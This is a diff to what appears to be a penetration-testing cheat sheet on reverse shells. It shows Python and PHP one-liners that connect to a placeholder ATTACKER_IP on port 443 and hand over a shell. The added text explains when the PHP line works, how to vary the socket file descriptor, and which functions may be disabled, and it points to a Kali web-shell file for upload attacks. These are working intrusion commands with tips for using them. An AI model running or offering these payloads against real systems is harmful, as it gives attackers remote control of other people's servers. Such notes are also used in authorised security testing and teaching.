@@ -71,8 +71,11 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443)
 php -r '$s=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
 ```
 
-- for PHP execution contexts — a web shell or PHP RCE. The socket is usually fd `3`, but that is environment-dependent; if nothing connects, the fd number is the first thing to vary.
+- a **command**, not a file: it runs where you can already execute shell commands (a web command panel, command injection, a web shell) and the `php` binary exists on the target. The socket is usually fd `3`, but that is environment-dependent; if nothing connects, the fd number is the first thing to vary.
 - `exec`, `system`, `shell_exec`, `passthru`, `popen` behave differently and are disabled independently — check what is enabled rather than assuming they are interchangeable.
+
+> [!warning]
+> Uploaded as a file, this line does nothing. The server parses an uploaded file as PHP source, and everything outside `<?php ... ?>` is sent back as plain text — it shows up in the browser verbatim. For an upload, use PHP code: `/usr/share/webshells/php/php-reverse-shell.php` on Kali, with `$ip` and `$port` edited. → [[File-Upload-Bypass]]
 
 ### PowerShell
 
